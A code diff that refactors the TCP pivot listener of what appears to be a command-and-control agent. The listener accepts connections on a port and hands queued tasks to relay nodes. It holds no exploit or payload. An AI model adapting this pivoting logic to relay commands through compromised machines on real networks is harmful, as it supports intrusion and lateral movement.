@@ -9,65 +9,46 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using Agent.Communication;
 using Agent.Helpers;
 using Agent.Models;
 
 namespace Agent.Service.Pivoting
 {
-    public class PivotTCPServer
+    public class PivotTCPServer : PivotServer
     {
-        private readonly int _bindPort;
-        private readonly IPAddress _bindAddress;
-        private readonly bool _isSecure;
 
-        private IMessageService _messageService;
-
-        public string Type
+        public PivotTCPServer(ConnexionUrl conn) : base(conn)
         {
-            get
-            {
-                if (_isSecure)
-                    return "tcps";
-                else
-                    return "tcp";
-            }
         }
 
-        public int Port
+
+        public override async Task Start()
         {
-            get
+            try
             {
-                return _bindPort;
+                this.Status = RunningService.RunningStatus.Running;
+
+                var listener = new TcpListener(IPAddress.Parse(Connexion.Address), this.Connexion.Port);
+                listener.Start(100);
+
+                while (!_tokenSource.IsCancellationRequested)
+                {
+                    // this blocks until a connection is received or token is cancelled
+                    var client = await listener.AcceptTcpClientAsync(_tokenSource);
+
+                    // do something with the connected client
+                    var thread = new Thread(async () => await HandleClient(client));
+                    thread.Start();
+                }
+                // handle client in new thread
+
+                listener.Stop();
             }
-        }
-
-        public PivotTCPServer(int bindPort, bool isSecure = true, IPAddress bindAddress = null)
-        {
-            _bindPort = bindPort;
-            _bindAddress = bindAddress ?? IPAddress.Any;
-            _isSecure = isSecure;
-            _messageService = ServiceProvider.GetService<IMessageService>();
-        }
-
-        private readonly CancellationTokenSource _tokenSource = new CancellationTokenSource();
-
-        public async Task Start()
-        {
-            var listener = new TcpListener(_bindAddress, _bindPort);
-            listener.Start(100);
-
-            while (!_tokenSource.IsCancellationRequested)
+            finally
             {
-                // this blocks until a connection is received or token is cancelled
-                var client = await listener.AcceptTcpClientAsync(_tokenSource);
-
-                // do something with the connected client
-                var thread = new Thread(async () => await HandleClient(client));
-                thread.Start();
+                this.Status = RunningService.RunningStatus.Stoped;
             }
-            // handle client in new thread
-
-            listener.Stop();
         }
 
         private async Task HandleClient(TcpClient client)
@@ -87,7 +68,7 @@ namespace Agent.Service.Pivoting
                     if (!client.DataAvailable())
                         continue;
 
-                    if (_isSecure)
+                    if (this.Connexion.IsSecure)
                         HandleSecureClient(client);
                     else
                         HandleNonSecureClient(client);
@@ -108,12 +89,6 @@ namespace Agent.Service.Pivoting
             }
         }
 
-
-        public void Stop()
-        {
-            _tokenSource.Cancel();
-        }
-
         private void HandleNonSecureClient(TcpClient client)
         {
             var req = client.ReceivedMessage();
@@ -128,7 +103,7 @@ namespace Agent.Service.Pivoting
                     relays.Add(mr.Header.Owner);
             }
 
-            Debug.WriteLine($"TCP Pivot {this._bindAddress}:{this._bindPort} Sending task to Relays {string.Join(",", relays)}");
+            Debug.WriteLine($"TCP Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
             var tasks = this._messageService.GetMessageTasksToRelay(relays);
             client.SendData(tasks.Serialize());
         }
@@ -167,7 +142,7 @@ namespace Agent.Service.Pivoting
                     relays.Add(mr.Header.Owner);
             }
 
-            Debug.WriteLine($"TCPS Pivot {this._bindAddress}:{this._bindPort} Sending task to Relays {string.Join(",", relays)}");
+            Debug.WriteLine($"TCPS Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
             var tasks = this._messageService.GetMessageTasksToRelay(relays);
 
             var meesage = tasks.Serialize();
